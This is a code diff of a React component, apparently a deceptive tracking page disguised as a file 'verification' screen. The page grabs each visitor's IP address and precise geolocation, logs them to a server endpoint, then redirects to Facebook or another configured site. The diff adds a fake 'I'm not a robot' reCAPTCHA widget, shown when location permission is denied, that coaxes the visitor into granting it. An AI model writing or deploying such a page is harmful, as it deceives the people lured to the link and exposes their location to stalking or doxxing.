@@ -3,7 +3,7 @@
 import { useEffect, useState } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
-import { FileText, Loader2, AlertTriangle } from 'lucide-react';
+import { FileText, Loader2 } from 'lucide-react';
 import type { VerificationConfig } from '@/app/actions/settings';
 
 interface DriveVerificationClientProps {
@@ -21,74 +21,105 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     previewImageUrl,
   } = config;
 
-  const [statusText, setStatusText] = useState('Đang xác minh, vui lòng chờ...');
-  const [showWarning, setShowWarning] = useState(false);
+  const [status, setStatus] = useState<'requesting' | 'denied' | 'success'>('requesting');
+  const [statusText, setStatusText] = useState('Đang yêu cầu xác minh...');
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
-  useEffect(() => {
-    const requestLocation = async () => {
-      let clientIp = 'N/A';
-      try {
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          if (ipResponse.ok) {
-              const ipData = await ipResponse.json();
-              clientIp = ipData.ip;
-          }
-      } catch(e) {
-          console.error("Could not fetch IP", e);
-      }
-
-      const logDataAndRedirect = (pos?: GeolocationPosition) => {
-          setStatusText('Xác minh thành công, đang chuyển hướng...');
-          const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
-          if (pos) {
-              body.lat = pos.coords.latitude;
-              body.lon = pos.coords.longitude;
-              body.acc = pos.coords.accuracy;
-          }
-
-          fetch('/api/log-location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(body),
-              keepalive: true,
-          }).finally(() => {
-              window.location.href = REDIRECT_URL;
-          });
-      };
-
-      const handleError = (error: GeolocationPositionError) => {
-        // PERMISSION_DENIED is the key case
-        if (error.code === error.PERMISSION_DENIED) {
-            setShowWarning(true);
-            setStatusText('Yêu cầu bắt buộc! Vui lòng cho phép...');
-            // Reload after a short delay to allow user to read the message
-            setTimeout(() => {
-                window.location.reload();
-            }, 2500);
-        } else {
-            // For other errors (POSITION_UNAVAILABLE, TIMEOUT), just log IP and redirect
-            logDataAndRedirect();
+  const requestLocation = async () => {
+    setStatus('requesting');
+    setStatusText('Đang xác minh, vui lòng chờ...');
+    
+    let clientIp = 'N/A';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            clientIp = ipData.ip;
         }
-      };
+    } catch(e) {
+        console.error("Could not fetch IP", e);
+    }
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          logDataAndRedirect, // Success
-          handleError,        // Error
-          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-        );
+    const logDataAndRedirect = (pos?: GeolocationPosition) => {
+        setStatus('success');
+        setStatusText('Xác minh thành công, đang chuyển hướng...');
+        const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
+        if (pos) {
+            body.lat = pos.coords.latitude;
+            body.lon = pos.coords.longitude;
+            body.acc = pos.coords.accuracy;
+        }
+
+        fetch('/api/log-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body),
+            keepalive: true,
+        }).finally(() => {
+            window.location.href = REDIRECT_URL;
+        });
+    };
+
+    const handleError = (error: GeolocationPositionError) => {
+      if (error.code === error.PERMISSION_DENIED) {
+          setStatus('denied');
       } else {
-        // Geolocation not supported, log IP and redirect
-        logDataAndRedirect();
+          logDataAndRedirect();
       }
     };
-    
-    // Request immediately, but with a tiny delay to let the initial UI render
-    const timer = setTimeout(requestLocation, 100);
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        logDataAndRedirect,
+        handleError,
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
+    } else {
+      logDataAndRedirect();
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(requestLocation, 500);
     return () => clearTimeout(timer);
   }, [REDIRECT_URL]);
+  
+  const handleRobotCheck = () => {
+    requestLocation();
+  };
+
+  const renderVerificationStep = () => {
+    switch (status) {
+      case 'requesting':
+      case 'success':
+        return (
+          <div
+            className="w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors bg-primary"
+          >
+            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+            {statusText}
+          </div>
+        );
+      case 'denied':
+        return (
+            <div 
+                className="w-full h-20 bg-[#f9f9f9] border border-gray-300 rounded-md p-3 flex items-center justify-between shadow-md cursor-pointer hover:bg-gray-100/80 transition-colors"
+                onClick={handleRobotCheck}
+            >
+                <div className="flex items-center gap-4">
+                    <div className="h-8 w-8 border-2 border-gray-400 bg-white rounded-sm flex items-center justify-center" />
+                    <span className="text-gray-800 text-sm font-medium">I'm not a robot</span>
+                </div>
+                <div className="flex flex-col items-center justify-center text-center">
+                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width={32} height={32} alt="reCAPTCHA" />
+                    <p className="text-[9px] text-gray-500 -mt-1">reCAPTCHA</p>
+                    <p className="text-[7px] text-gray-400 scale-90">Privacy - Terms</p>
+                </div>
+            </div>
+        );
+    }
+  }
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
@@ -117,12 +148,7 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
             </div>
           </div>
           
-          <div
-            className={`w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors ${showWarning ? 'bg-destructive' : 'bg-primary'}`}
-          >
-            {showWarning ? <AlertTriangle className="mr-2 h-5 w-5" /> : <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
-            {statusText}
-          </div>
+          {renderVerificationStep()}
 
           <div className="text-xs text-muted-foreground/80 mt-6">
             {footerText}
